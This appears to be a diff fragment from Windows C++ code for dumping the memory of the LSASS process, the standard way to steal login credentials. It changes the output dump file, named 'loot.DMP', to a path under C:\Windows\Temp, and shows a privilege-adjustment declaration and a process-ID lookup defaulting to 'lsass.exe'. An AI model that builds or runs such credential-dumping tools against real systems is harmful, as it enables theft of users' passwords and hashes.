@@ -5,7 +5,7 @@
 // boolean ref: https://devblogs.microsoft.com/oldnewthing/20041222-00/?p=36923
 EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 
-const LPCWSTR dmpPath = L"loot.DMP";
+const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot.DMP";
 
 // get Process ID by process name
 DWORD getPID(LPCWSTR procName = L"lsass.exe") {
